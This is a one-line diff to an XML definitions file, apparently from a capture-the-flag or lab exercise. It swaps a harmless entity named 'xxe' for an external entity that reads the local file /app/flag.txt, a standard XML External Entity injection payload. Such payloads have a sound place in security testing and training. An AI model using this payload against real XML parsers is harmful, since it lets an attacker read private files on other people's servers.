@@ -1,1 +1,1 @@
-<!ENTITY xxe "HELLO_FROM_DTD">
+<!ENTITY xxe SYSTEM "file:///app/flag.txt">
